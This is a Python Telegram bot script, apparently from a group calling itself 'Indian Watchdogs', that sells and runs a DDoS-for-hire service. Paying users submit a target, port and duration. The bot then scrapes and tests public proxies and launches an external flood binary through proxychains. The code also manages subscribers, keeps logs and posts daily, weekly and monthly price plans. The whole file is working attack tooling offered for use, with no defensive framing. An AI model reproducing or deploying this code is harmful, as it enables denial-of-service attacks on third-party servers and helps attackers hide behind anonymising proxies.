#!/usr/bin/python3
# By Indian Watchdogs @Indian_Hackers_Team

import random
import telebot
import subprocess
import requests
import datetime
import os
from concurrent.futures import ThreadPoolExecutor

# Insert your Telegram bot token here
bot = telebot.TeleBot('YOUR_TELEGRAM_BOT_TOKEN')

# Admin user IDs
admin_id = ["5676702497"]

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"

# Function to fetch proxies from the API
def fetch_proxies():
    url = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=1000&country=all&ssl=all&anonymity=all"
    response = requests.get(url)
    proxies = response.text.split('\n')
    return [proxy.strip() for proxy in proxies if proxy.strip()]

# Function to check proxy validity
def check_http_proxy(proxy):
    url = "http://icanhazip.com"  # URL to test the proxy with
    proxies = {
        "http": f"http://{proxy}",
        "https": f"http://{proxy}",
    }
    try:
        response = requests.get(url, proxies=proxies, timeout=3)
        if response.status_code == 200:
            return proxy
    except requests.RequestException:
        return None

# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Function to log command to the file
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found."
            else:
                file.truncate(0)
                response = "Logs cleared successfully"
    except FileNotFoundError:
        response = "No logs found to clear."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_add = command[1]
            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                response = f"User {user_to_add} Added Successfully."
            else:
                response = "User already exists."
        else:
            response = "Please specify a user ID to add."
    else:
        response = "Only Admin Can Run This Command."

    bot.reply_to(message, response)

@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"User {user_to_remove} removed successfully."
            else:
                response = f"User {user_to_remove} not found in the list."
        else:
            response = '''Please Specify A User ID to Remove. 
 Usage: /remove <userid>'''
    else:
        response = "Only Admin Can Run This Command."

    bot.reply_to(message, response)

@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "Logs are already cleared. No data found."
                else:
                    file.truncate(0)
                    response = "Logs Cleared Successfully"
        except FileNotFoundError:
            response = "Logs are already cleared."
    else:
        response = "Only Admin Can Run This Command."
    bot.reply_to(message, response)

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "No data found"
        except FileNotFoundError:
            response = "No data found"
    else:
        response = "Only Admin Can Run This Command."
    bot.reply_to(message, response)

@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "No data found."
                bot.reply_to(message, response)
        else:
            response = "No data found"
            bot.reply_to(message, response)
    else:
        response = "Only Admin Can Run This Command."
        bot.reply_to(message, response)

@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"Your ID: {user_id}"
    bot.reply_to(message, response)

# Function to handle the reply when free users run the /bgmi command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI\nBy Indian Watchdogs @Indian_Hackers_Team"
    bot.reply_to(message, response)

# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

COOLDOWN_TIME = 0

# Handler for /bgmi command
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        if user_id not in admin_id and user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 300:
            response = "You Are On Cooldown. Please Wait 5min Before Running The /bgmi Command Again."
            bot.reply_to(message, response)
            return
        bgmi_cooldown[user_id] = datetime.datetime.now()

        command = message.text.split()
        if len(command) == 4:
            target = command[1]
            port = int(command[2])
            time = int(command[3])
            if time > 5000:
                response = "Error: Time interval must be less than 80."
            else:
                # Fetch and check proxies for each command
                proxies = fetch_proxies()
                with ThreadPoolExecutor(max_workers=1000) as executor:
                    results = list(executor.map(check_http_proxy, proxies))
                working_proxies = [proxy for proxy in results if proxy is not None]

                # Ensure there are working proxies available
                if not working_proxies:
                    response = "No working proxies found. Please try again later."
                    bot.reply_to(message, response)
                    return

                # Select a random working proxy for the attack
                proxy = random.choice(working_proxies)

                # Using `proxychains` to route the command through a proxy
                full_command = f"proxychains -q -f <(echo 'http {proxy}') ./bgmi {target} {port} {time} 900"
                subprocess.run(full_command, shell=True, executable='/bin/bash')

                # Clear the proxies file after use
                with open("working_proxies.txt", "w") as file:
                    file.truncate(0)

                response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}"
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)
        else:
            response = "Usage :- /bgmi <target> <port> <time>\nBy Indian Watchdogs @Indian_Hackers_Team"
    else:
        response = "You Are Not Authorized To Use This Command.\nBy Indian Watchdogs @Indian_Hackers_Team"

    bot.reply_to(message, response)

# Add /mylogs command to display logs recorded for bgmi and website commands
@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your Command Logs:\n" + "".join(user_logs)
                else:
                    response = "No Command Logs Found For You."
        except FileNotFoundError:
            response = "No command logs found."
    else:
        response = "You Are Not Authorized To Use This Command."

    bot.reply_to(message, response)

@bot.message_handler(commands=['help'])
def show_help(message):
    help_text = '''Available commands:
 /bgmi : Method For Bgmi Servers. 
 /rules : Please Check Before Use !!.
 /mylogs : To Check Your Recents Attacks.
 /plan : Checkout Our Botnet Rates.

 To See Admin Commands:
 /admincmd : Shows All Admin Commands.
 By Indian Watchdogs @Indian_Hackers_Team
'''
    for handler in bot.message_handlers:
        if hasattr(handler, 'commands'):
            if message.text.startswith('/help'):
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
            elif handler.doc and 'admin' in handler.doc.lower():
                continue
            else:
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f"Welcome to Your Home, {user_name}! Feel Free to Explore.\nTry To Run This Command : /help\nWelcome To The World's Best Ddos Bot\nBy Indian Watchdogs @Indian_Hackers_Team"
    bot.reply_to(message, response)

@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} Please Follow These Rules:

1. Dont Run Too Many Attacks !! Cause A Ban From Bot
2. Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot. 
3. We Daily Checks The Logs So Follow these rules to avoid Ban!!
By Indian Watchdogs @Indian_Hackers_Team'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Brother Only 1 Plan Is Powerfull Then Any Other Ddos !!:

Vip :
-> Attack Time : 200 (S)
> After Attack Limit : 2 Min
-> Concurrents Attack : 300

Price List:
Day-->150 Rs
Week-->900 Rs
Month-->1600 Rs
By Indian Watchdogs @Indian_Hackers_Team
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['admincmd'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Admin Commands Are Here!!:

/add <userId> : Add a User.
/remove <userid> Remove a User.
/allusers : Authorised Users Lists.
/logs : All Users Logs.
/broadcast : Broadcast a Message.
/clearlogs : Clear The Logs File.
By Indian Watchdogs @Indian_Hackers_Team
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "Message To All Users By Admin:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = "Broadcast Message Sent Successfully To All Users."
        else:
            response = "Please Provide A Message To Broadcast."
    else:
        response = "Only Admin Can Run This Command."

    bot.reply_to(message, response)

bot.polling()
# By Indian Watchdogs @Indian_Hackers_Team
